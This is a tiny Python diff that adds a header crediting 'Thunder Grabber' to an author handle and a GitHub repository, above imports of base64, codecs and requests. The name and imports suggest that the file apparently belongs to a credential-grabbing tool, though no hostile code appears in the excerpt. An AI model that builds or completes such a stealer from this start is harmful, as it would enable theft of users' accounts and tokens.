@@ -1,3 +1,6 @@
+#Thunder Grabber Made BY TWISTX7#9122
+# https://github.com/TWIST-X7/Thunder-Grabber
+
 import base64
 import codecs
 import requests
